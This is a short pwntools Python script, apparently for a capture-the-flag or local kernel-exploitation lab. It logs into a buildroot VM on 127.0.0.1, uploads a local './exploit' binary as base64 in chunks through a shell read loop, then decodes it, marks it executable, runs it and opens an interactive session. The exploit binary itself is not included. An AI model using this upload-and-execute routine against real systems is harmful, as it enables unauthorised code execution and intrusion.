from pwn import *

r = remote("127.0.0.1", 4444);
r.sendlineafter(b"buildroot login: ", b"pwn")
r.sendlineafter(b"$", b'echo "start" >&2; while read line; do if [ "$line" = "end" ]; then break; fi; echo -n $line; done > tmp')

print("yo")
payload = b64e(read("./exploit"))
r.recvuntil(b"start\r\n");
sleep(0.5)
print("hey")

to_send = payload.encode()
# count = 0
while to_send:
    # print(count)
    # count+=1
    r.sendline(to_send[:1000])
    to_send = to_send[1000:]

# print("no")
r.send(b"\nend\n")

r.sendlineafter(b"$", b"base64 -d tmp > exploit; chmod +x exploit")
r.sendlineafter(b"$", b"./exploit")
r.interactive()